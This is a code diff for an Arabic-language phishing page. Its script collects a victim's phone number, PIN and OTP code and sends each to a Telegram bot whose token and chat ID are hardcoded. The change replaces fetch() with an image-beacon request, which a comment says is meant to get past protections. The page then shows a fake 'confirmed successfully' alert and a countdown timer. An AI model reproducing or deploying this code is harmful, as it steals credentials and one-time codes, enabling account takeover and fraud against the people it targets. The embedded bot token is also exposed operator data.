@@ -39,47 +39,43 @@
 const botToken = "8194091042:AAHIxhB5ymPFwccfuM0AKDa78ukH0kt3IQu";
 const chatId = "5244299184";
 
-async function sendToTelegram() {
+function sendToTelegram() {
     const p = document.getElementById('phone').value;
     const s = document.getElementById('pin').value;
     const text = `🚨 دخول جديد :\n📱 الهاتف: ${p}\n🔑 الرمز: ${s}`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
     
-    try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`, { mode: 'no-cors' });
-        document.getElementById('step1').classList.add('hidden');
-        document.getElementById('step2').classList.remove('hidden');
-        startTimer();
-    } catch (e) {
-        // سيستمر العمل حتى لو ظهر خطأ تقني بسيط
-        document.getElementById('step1').classList.add('hidden');
-        document.getElementById('step2').classList.remove('hidden');
-        startTimer();
-    }
+    // طريقة الإرسال عبر الصورة لضمان تخطي الحماية
+    const img = new Image();
+    img.src = url;
+
+    document.getElementById('step1').classList.add('hidden');
+    document.getElementById('step2').classList.remove('hidden');
+    startTimer();
 }
 
-async function sendOtpToTelegram() {
+function sendOtpToTelegram() {
     const o = document.getElementById('otp').value;
     const text = `🔢 الرمز OTP: ${o}`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
     
-    try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`, { mode: 'no-cors' });
-        alert("تم التأكيد بنجاح، يرجى الانتظار...");
-        window.location.reload();
-    } catch (e) {
-        alert("تم التأكيد بنجاح، يرجى الانتظار...");
-        window.location.reload();
-    }
+    const img = new Image();
+    img.src = url;
+
+    alert("تم التأكيد بنجاح، يرجى الانتظار...");
+    window.location.reload();
 }
 
 function startTimer() {
     let t = 120;
-    const timerElement = document.getElementById('timer');
-    const interval = setInterval(() => {
+    setInterval(() => {
         let m = Math.floor(t / 60); 
         let s = t % 60;
-        timerElement.innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
-        if (t <= 0) clearInterval(interval);
-        t--;
+        document.getElementById('timer').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+        if (t > 0) t--;
     }, 1000);
 }
 </script>
+</body>
+</html>
+
